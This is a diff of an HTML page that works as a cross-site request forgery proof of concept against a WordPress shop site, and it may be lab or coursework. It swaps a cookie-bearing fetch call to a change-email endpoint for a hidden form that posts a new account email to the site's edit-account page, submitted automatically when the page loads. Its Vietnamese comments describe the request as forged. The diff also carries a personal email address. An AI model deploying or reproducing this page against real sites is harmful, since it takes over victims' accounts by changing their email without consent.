@@ -2971,23 +2971,18 @@
       defer
       data-wp-strategy="defer"
     ></script>
+    <!-- Form để gửi yêu cầu POST giả mạo -->
+    <form
+      method="POST"
+      action="https://mydecobox.shop/my-account/edit-account/"
+    >
+      <input type="hidden" name="user_email" value="lcnhu.uit@gmail.com" />
+      <!-- Thêm token CSRF -->
+      <input type="submit" value="Submit" />
+    </form>
+
     <script>
-      fetch("https://mydecobox.shop/wp-json/demo/v1/change-email", {
-        method: "POST",
-        credentials: "include", // gửi kèm cookie session
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: "attacker@example.com" }),
-      })
-        .then((r) => r.json())
-        .then((data) => {
-          if (data.success) {
-            alert("Email đã bị thay thành: " + data.new_email);
-            // Chuyển về trang account để nhìn thấy thay đổi
-            window.location = "https://mydecobox.shop/my-account/edit-account/";
-          } else {
-            console.error("Không thành công", data);
-          }
-        });
+      document.forms[0].submit(); // Tự động gửi form khi trang được tải
     </script>
   </body>
 </html>
